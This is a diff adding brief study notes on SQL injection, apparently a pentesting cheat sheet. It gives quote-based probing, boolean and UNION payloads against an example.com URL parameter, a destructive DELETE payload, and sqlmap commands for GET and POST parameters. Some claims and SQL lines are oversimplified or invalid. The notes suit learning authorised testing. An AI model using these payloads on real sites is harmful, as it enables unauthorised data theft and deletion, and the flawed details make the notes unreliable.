@@ -1,0 +1,48 @@
+SQL INJECTION
+
+SQL Syntax
+	> SELECT <columns list> FROM <table> WHERE <condition>;
+	
+	> SELECT 22, 'string', 0x12, 'another string';
+
+UNION COMMAND
+	> <SELECT statement> UNION <other SELECT STATMENT>;
+
+Examples:
+
+	a Database has Name (Shoes) and Description (Nice Shoes)
+	SELECT Name, Description FROM Products WHERE Name='Shoes';
+				OR
+	SELECT Name, Description FROM Products WHERE ID='1';
+
+	SELECT * FROM User (this will dump the user database)
+
+SQL Injection
+	Testing site
+		add ' at the end 
+	example:
+		example.com/view.php?id=1141
+		example.com/view.php?id=1141'
+	See what comes back, if 404 not found, then as a now it is not injectable
+	However if sql code comes back, it is injectable
+
+Boolean Based
+	Making a true or false statement (1 = 1)
+		example.com/view.php?id=' or 'a' = 'a
+	This makes a true statement, because a will always equal a, thus dumping the database
+Union Based
+	UNION SELECT null; -- -
+		example.com/view.php?id=' UNION SELECT user(), 'elsid2'; -- - elsid is a username you may have enumerated, this command will show you
+		database information about elsid2
+
+We can also change the availabilty of objects
+	DELETE description FROM items WHERE id=' 1' or '1'='1';
+
+SQLMAP 
+	sqlmap -u (url) -p (injection parameters) [options]
+	sqlmap -u 'http://example.com/view.php?id=1141' -p id --technique=U
+		This command will id parameter of a GET request for view.php
+		the technique=U states to use a UNION based SQL injection
+for POST exploits
+	sqlmap -u <url> --data=<POST string> -p (injection parameters) [options]
+		Remember you can get the post strings from Burp
